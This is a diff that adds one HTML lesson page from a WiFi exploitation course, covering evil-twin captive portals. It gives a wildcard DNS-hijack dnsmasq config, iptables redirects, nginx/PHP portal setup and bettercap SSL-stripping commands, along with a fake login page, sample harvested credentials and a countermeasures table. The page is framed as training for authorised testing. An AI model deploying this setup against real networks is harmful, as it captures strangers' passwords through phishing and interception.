@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 10 — Captive Portals & Credential Harvesting | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt { color:var(--accent2); user-select:none; }
+    .cmd { color:#e6edf3; }
+    .flag { color:#ffa657; }
+    .str { color:#a5d6ff; }
+    .cmt { color:#6e7681; font-style:italic; }
+    .out { color:var(--text-dim); }
+    .out-ok { color:var(--accent2); }
+    .out-warn { color:var(--warn); }
+    .out-err { color:var(--accent3); }
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
+    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
+    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Config block */
+    .config-block { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; }
+    .config-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .config-bar span { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); }
+    .config-bar button { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; transition:all 0.15s; }
+    .config-bar button:hover { border-color:var(--accent); color:var(--accent); }
+    .config-bar button.copied { border-color:var(--accent2); color:var(--accent2); }
+    .config-body { padding:16px 18px; font-family:var(--font-mono); font-size:13px; line-height:1.9; white-space:pre-wrap; }
+    .cfg-key { color:#ffa657; }
+    .cfg-val { color:#a5d6ff; }
+    .cfg-comment { color:#6e7681; font-style:italic; }
+
+    /* Attack flow */
+    .flow-chain { display:flex; flex-direction:column; gap:0; margin:20px 0; }
+    .flow-node { display:flex; align-items:flex-start; gap:16px; }
+    .flow-spine { display:flex; flex-direction:column; align-items:center; }
+    .flow-circle { width:36px; height:36px; border-radius:50%; background:rgba(88,166,255,0.15); border:2px solid var(--accent); display:flex; align-items:center; justify-content:center; font-size:12px; color:var(--accent); font-family:var(--font-mono); font-weight:700; flex-shrink:0; }
+    .flow-line { width:2px; flex:1; min-height:24px; background:var(--border); margin:4px 0; }
+    .flow-content { padding:4px 0 20px; }
+    .flow-content h4 { font-size:13px; color:var(--text-head); margin-bottom:4px; }
+    .flow-content p { font-size:12px; color:var(--text-dim); margin:0; }
+    .flow-content code { font-size:11px; }
+
+    /* Portal preview */
+    .portal-preview { border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:20px 0; }
+    .portal-preview-bar { background:var(--bg-card); padding:10px 16px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; font-size:12px; color:var(--text-dim); }
+    .portal-preview-bar .lock-icon { color:var(--accent3); }
+    .portal-preview-bar .url { font-family:var(--font-mono); color:var(--warn); }
+    .portal-inner { background:#f5f5f5; padding:40px 20px; display:flex; justify-content:center; }
+    .portal-card { background:white; padding:32px; border-radius:10px; box-shadow:0 2px 20px rgba(0,0,0,0.15); width:320px; }
+    .portal-card h3 { color:#333; font-size:18px; margin-bottom:8px; font-family:var(--font-body); }
+    .portal-card p { color:#666; font-size:13px; margin-bottom:20px; font-family:var(--font-body); line-height:1.5; }
+    .portal-card .fake-input { background:#f9f9f9; border:1px solid #ddd; border-radius:6px; padding:10px 12px; font-size:13px; color:#999; margin-bottom:10px; font-family:var(--font-body); }
+    .portal-card .fake-btn { background:#0078d4; color:white; border:none; border-radius:6px; padding:12px; width:100%; font-size:14px; cursor:default; font-family:var(--font-body); font-weight:600; }
+    .portal-card .fake-note { font-size:11px; color:#aaa; text-align:center; margin-top:12px; font-family:var(--font-body); }
+    .portal-caption { background:var(--bg-card); padding:10px 16px; font-size:12px; color:var(--accent3); border-top:1px solid var(--border); }
+
+    /* Simulator */
+    .portal-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .portal-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-controls { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
+    .sim-control { display:flex; flex-direction:column; gap:6px; }
+    .sim-control label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-control select, .sim-control input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; min-width:160px; }
+    .sim-control select:focus, .sim-control input:focus { border-color:var(--accent); }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; align-self:flex-end; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:160px; white-space:pre-wrap; }
+    .harvested-log { margin-top:16px; }
+    .harvested-log h4 { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:8px; }
+    .log-entry { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 14px; font-family:var(--font-mono); font-size:12px; margin-bottom:6px; }
+    .log-ts { color:var(--text-dim); }
+    .log-user { color:var(--accent); }
+    .log-pass { color:var(--accent3); }
+    .log-ip { color:var(--warn); }
+
+    /* Nav footer */
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.next { background:var(--accent); color:#0d1117; }
+    .nav-btn.next:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="#" class="active"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 10</div>
+      <div class="module-badge">&#9679; Tier 6 &mdash; Rogue AP &amp; Social Engineering</div>
+      <h1>Captive Portals &amp; Credential Harvesting</h1>
+      <p class="subtitle">Intercept victim traffic with DNS hijacking, serve credential-capture pages via nginx, strip SSL, and harvest logins from clients connected to an evil twin AP.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Advanced</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~55 min</div>
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Requires Module 09</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> Intercepting credentials or deploying captive portals on networks you do not own or have written authorization to test is a criminal offence. All techniques here are for authorized penetration testing and lab environments only.</p>
+    </div>
+
+    <!-- Section 1: Architecture -->
+    <section id="architecture">
+      <h2><span class="section-num">01</span> Attack Architecture</h2>
+      <p>A captive portal attack builds on the Evil Twin (Module 09). Once clients are connected to your rogue AP, you control DNS, HTTP, and routing — enabling full credential interception.</p>
+
+      <div class="flow-chain">
+        <div class="flow-node">
+          <div class="flow-spine"><div class="flow-circle">1</div><div class="flow-line"></div></div>
+          <div class="flow-content">
+            <h4>Evil Twin AP Active</h4>
+            <p>Victim connects to rogue AP via <code>hostapd</code> + deauth from Module 09</p>
+          </div>
+        </div>
+        <div class="flow-node">
+          <div class="flow-spine"><div class="flow-circle">2</div><div class="flow-line"></div></div>
+          <div class="flow-content">
+            <h4>DHCP Lease Issued</h4>
+            <p><code>dnsmasq</code> assigns IP <code>10.0.0.x</code> with gateway &amp; DNS pointing to attacker</p>
+          </div>
+        </div>
+        <div class="flow-node">
+          <div class="flow-spine"><div class="flow-circle">3</div><div class="flow-line"></div></div>
+          <div class="flow-content">
+            <h4>DNS Wildcard Hijack</h4>
+            <p><code>address=/#/10.0.0.1</code> — every domain resolves to attacker's IP</p>
+          </div>
+        </div>
+        <div class="flow-node">
+          <div class="flow-spine"><div class="flow-circle">4</div><div class="flow-line"></div></div>
+          <div class="flow-content">
+            <h4>HTTP Redirect to Portal</h4>
+            <p><code>nginx</code> serves fake login page; <code>iptables</code> catches all port 80 traffic</p>
+          </div>
+        </div>
+        <div class="flow-node">
+          <div class="flow-spine"><div class="flow-circle">5</div><div class="flow-line"></div></div>
+          <div class="flow-content">
+            <h4>Credential Capture</h4>
+            <p>PHP logs username + password to file; victim redirected to real site</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>Key insight:</strong> The attacker controls DNS, so every domain name the victim types resolves to <code>10.0.0.1</code>. The victim's browser opens what looks like the correct site — but it's your server.</div>
+      </div>
+    </section>
+
+    <!-- Section 2: DNS Hijacking -->
+    <section id="dns">
+      <h2><span class="section-num">02</span> DNS Hijacking with dnsmasq</h2>
+      <p>The wildcard DNS directive is the keystone of every captive portal attack.</p>
+
+      <div class="config-block">
+        <div class="config-bar">
+          <span>&#128196; /etc/dnsmasq_portal.conf</span>
+          <button onclick="copyConfig(this,'copy-dnsmasq')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-dnsmasq"><span class="cfg-comment"># Captive portal dnsmasq config</span>
+<span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>
+<span class="cfg-key">no-resolv</span>
+
+<span class="cfg-comment"># *** WILDCARD: return attacker IP for EVERY domain ***</span>
+<span class="cfg-key">address</span>=<span class="cfg-val">/#/10.0.0.1</span>
+
+<span class="cfg-key">dhcp-range</span>=<span class="cfg-val">10.0.0.10,10.0.0.100,1h</span>
+<span class="cfg-key">dhcp-option</span>=<span class="cfg-val">3,10.0.0.1</span>   <span class="cfg-comment"># gateway</span>
+<span class="cfg-key">dhcp-option</span>=<span class="cfg-val">6,10.0.0.1</span>   <span class="cfg-comment"># DNS server</span>
+<span class="cfg-key">log-queries</span>
+<span class="cfg-key">log-facility</span>=<span class="cfg-val">/var/log/dnsmasq_portal.log</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Start dnsmasq &amp; verify DNS hijack</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-dns-start')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-dns-start"><span class="cmt"># Start dnsmasq in foreground</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo dnsmasq <span class="flag">-C</span> /etc/dnsmasq_portal.conf <span class="flag">--no-daemon</span></span>
+<span class="out-ok">dnsmasq: started, version 2.89 cachesize 150</span>
+<span class="out-ok">dnsmasq-dhcp: DHCP, IP range 10.0.0.10 -- 10.0.0.100, lease time 1h</span>
+
+<span class="cmt"># Verify hijack from a test machine:</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">nslookup google.com 10.0.0.1</span>
+<span class="out">Server:   10.0.0.1</span>
+<span class="out-warn">Address:  10.0.0.1#53</span>
+<span class="out-warn">Name:     google.com</span>
+<span class="out-err">Address:  10.0.0.1    ← hijacked!</span></div>
+      </div>
+    </section>
+
+    <!-- Section 3: Portal Page Preview -->
+    <section id="portal-page">
+      <h2><span class="section-num">03</span> Captive Portal Page</h2>
+      <p>The portal page is served by nginx and mimics a legitimate login screen. Below is a preview of what the victim sees.</p>
+
+      <div class="portal-preview">
+        <div class="portal-preview-bar">
+          <span class="lock-icon">&#128275;</span>
+          <span class="url">http://10.0.0.1/</span>
+          <span style="margin-left:auto;color:var(--accent3);font-size:11px;">&#9888; Not secure — attacker's server</span>
+        </div>
+        <div class="portal-inner">
+          <div class="portal-card">
+            <h3>&#128246; CoffeeShop WiFi</h3>
+            <p>Your session has expired. Please log in again to continue.</p>
+            <div class="fake-input">Email or username</div>
+            <div class="fake-input">Password</div>
+            <button class="fake-btn">Connect to WiFi</button>
+            <p class="fake-note">By connecting you agree to our terms of service.</p>
+          </div>
+        </div>
+        <div class="portal-caption">&#9888; This is a simulated preview — credentials submitted here go to the attacker's PHP logger</div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">nginx + PHP setup</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-nginx')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-nginx"><span class="cmt"># Install web server and PHP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo apt install <span class="flag">-y</span> nginx php-fpm</span>
+
+<span class="cmt"># Create portal directory</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mkdir <span class="flag">-p</span> /var/www/portal</span>
+
+<span class="cmt"># Enable portal site config, remove default</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo ln <span class="flag">-s</span> /etc/nginx/sites-available/portal /etc/nginx/sites-enabled/</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo rm /etc/nginx/sites-enabled/default</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo systemctl restart nginx php8.1-fpm</span>
+<span class="out-ok">[ OK ] nginx started</span></div>
+      </div>
+    </section>
+
+    <!-- Section 4: iptables redirect -->
+    <section id="iptables">
+      <h2><span class="section-num">04</span> iptables Redirect Rules</h2>
+      <p>Even clients that hard-code IP addresses or bypass DNS need to hit your portal. Use <code>iptables</code> PREROUTING to redirect all TCP port 80 traffic to nginx.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Full iptables captive portal ruleset</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-iptables')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-iptables"><span class="cmt"># Flush existing rules</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-F</span> && sudo iptables <span class="flag">-t</span> nat <span class="flag">-F</span></span>
+
+<span class="cmt"># Redirect all HTTP (port 80) from AP interface to nginx</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-t</span> nat <span class="flag">-A</span> PREROUTING <span class="flag">-i</span> wlan1 <span class="flag">-p</span> tcp <span class="flag">--dport</span> <span class="str">80</span> <span class="flag">-j</span> REDIRECT <span class="flag">--to-port</span> <span class="str">80</span></span>
+
+<span class="cmt"># Redirect HTTPS (port 443) — for SSL stripping</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-t</span> nat <span class="flag">-A</span> PREROUTING <span class="flag">-i</span> wlan1 <span class="flag">-p</span> tcp <span class="flag">--dport</span> <span class="str">443</span> <span class="flag">-j</span> REDIRECT <span class="flag">--to-port</span> <span class="str">443</span></span>
+
+<span class="cmt"># Allow DNS passthrough</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-A</span> INPUT <span class="flag">-i</span> wlan1 <span class="flag">-p</span> udp <span class="flag">--dport</span> <span class="str">53</span> <span class="flag">-j</span> ACCEPT</span>
+
+<span class="cmt"># Verify</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-t</span> nat <span class="flag">-L</span> PREROUTING <span class="flag">-n</span> <span class="flag">-v</span></span></div>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128161;</span>
+        <div><strong>Captive portal detection:</strong> Modern OSes (Android, iOS, Windows) probe known URLs (e.g., <code>connectivitycheck.google.com</code>) at connection time. If they get a redirect instead of the expected response, they display a "Sign in to network" notification — which is exactly what you want the victim to click.</div>
+      </div>
+    </section>
+
+    <!-- Section 5: SSL Stripping -->
+    <section id="ssl">
+      <h2><span class="section-num">05</span> SSL Stripping</h2>
+      <p>Clients that navigate directly to HTTPS sites bypass your HTTP portal. SSL stripping downgrades connections so you can intercept them.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Technique</th><th>Tool</th><th>Effective Against</th><th>Blocked By</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>SSL Strip</td><td>bettercap</td><td>Non-HSTS HTTP sites</td><td>HSTS, HSTS Preload</td></tr>
+            <tr><td>Reverse Proxy</td><td>Modlishka</td><td>Most sites (valid cert presented)</td><td>Cert pinning, HSTS Preload</td></tr>
+            <tr><td>DNS Hijack only</td><td>dnsmasq</td><td>HTTP traffic, captive portals</td><td>HTTPS, VPN</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">bettercap SSL stripping</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-sslstrip')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-sslstrip"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bettercap <span class="flag">-iface</span> wlan1</span>
+
+<span class="cmt"># Inside bettercap interactive shell:</span>
+<span class="out">&gt; </span><span class="cmd">net.probe on</span>
+<span class="out">&gt; </span><span class="cmd">set arp.spoof.targets <span class="str">10.0.0.0/24</span></span>
+<span class="out">&gt; </span><span class="cmd">arp.spoof on</span>
+<span class="out">&gt; </span><span class="cmd">set https.proxy.sslstrip <span class="str">true</span></span>
+<span class="out">&gt; </span><span class="cmd">https.proxy on</span>
+<span class="out">&gt; </span><span class="cmd">http.proxy on</span>
+<span class="out">&gt; </span><span class="cmd">net.sniff on</span>
+
+<span class="cmt"># View captured credentials:</span>
+<span class="out">&gt; </span><span class="cmd">events.show</span>
+<span class="out-warn">[14:32:01] [http.proxy] POST http://login.example.com/auth</span>
+<span class="out-err">           username=alice&amp;password=Summer2024!</span></div>
+      </div>
+
+      <div class="callout warn">
+        <span class="ci">&#9888;</span>
+        <div><strong>HSTS Preload:</strong> Google, Facebook, and thousands of major sites are on the HSTS Preload list. Browsers refuse HTTP connections to these domains regardless of DNS or redirects. SSL stripping is ineffective against preloaded domains in any modern browser.</div>
+      </div>
+    </section>
+
+    <!-- Section 6: Simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">06</span> Credential Harvesting Simulator</h2>
+      <p>Simulate the full captive portal pipeline — DNS hijack, portal delivery, and credential logging.</p>
+
+      <div class="portal-sim">
+        <h3>&#128229; Captive Portal Simulator</h3>
+        <div class="sim-controls">
+          <div class="sim-control">
+            <label>Portal Type</label>
+            <select id="portalType">
+              <option value="wifi">WiFi Password Prompt</option>
+              <option value="login">Generic Login Page</option>
+              <option value="corporate">Corporate SSO Clone</option>
+            </select>
+          </div>
+          <div class="sim-control">
+            <label>SSL Stripping</label>
+            <select id="sslMode">
+              <option value="off">Disabled</option>
+              <option value="on">Enabled (bettercap)</option>
+            </select>
+          </div>
+          <button class="sim-btn" onclick="runPortalSim()">&#9658; Run Simulation</button>
+        </div>
+        <div class="sim-output" id="portalOutput"><span style="color:var(--text-dim);">Select portal type and click "Run Simulation"...</span></div>
+        <div class="harvested-log" id="harvestedSection" style="display:none;">
+          <h4>&#128196; /var/log/harvested.log</h4>
+          <div id="harvestedEntries"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 7: Countermeasures -->
+    <section id="countermeasures">
+      <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Indicator</th><th>What It Means</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>URL shows <code>http://</code> for an always-HTTPS site</td><td>SSL stripping in progress</td></tr>
+            <tr><td>TLS certificate warning in browser</td><td>Reverse proxy or MITM</td></tr>
+            <tr><td>Every domain resolves to same IP</td><td>DNS wildcard hijack</td></tr>
+            <tr><td>Login page appears after connecting to public WiFi</td><td>Captive portal (may be legitimate)</td></tr>
+            <tr><td>Redirect after submitting credentials</td><td>Portal logged your credentials</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128274;</span>
+        <div><strong>Best defenses:</strong> (1) Always use a VPN on public Wi-Fi — encrypts all traffic end-to-end. (2) Never ignore TLS certificate warnings. (3) Check the URL before entering credentials. (4) Enable "HTTPS-only mode" in your browser.</div>
+      </div>
+    </section>
+
+    <!-- Nav -->
+    <div class="nav-footer">
+      <a href="../module-09-evil-twin/" class="nav-btn prev">&#8592; Module 09: Evil Twin</a>
+      <a href="../module-11-wps-attacks/" class="nav-btn next">Module 11: WPS Attacks &#8594;</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
+      btn.textContent = 'Copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  function copyConfig(btn, id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
+      btn.textContent = 'Copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  const fakeUsers = [
+    { user: 'alice@gmail.com',   pass: 'CoffeeShop1!',  ip: '10.0.0.12' },
+    { user: 'bob.smith',         pass: 'Summer2024',     ip: '10.0.0.23' },
+    { user: 'carol@corp.com',    pass: 'P@ssw0rd123',    ip: '10.0.0.34' },
+    { user: 'david99',           pass: 'qwerty123',      ip: '10.0.0.47' },
+  ];
+
+  function randomTs() {
+    const now = new Date();
+    const hh = String(now.getHours()).padStart(2,'0');
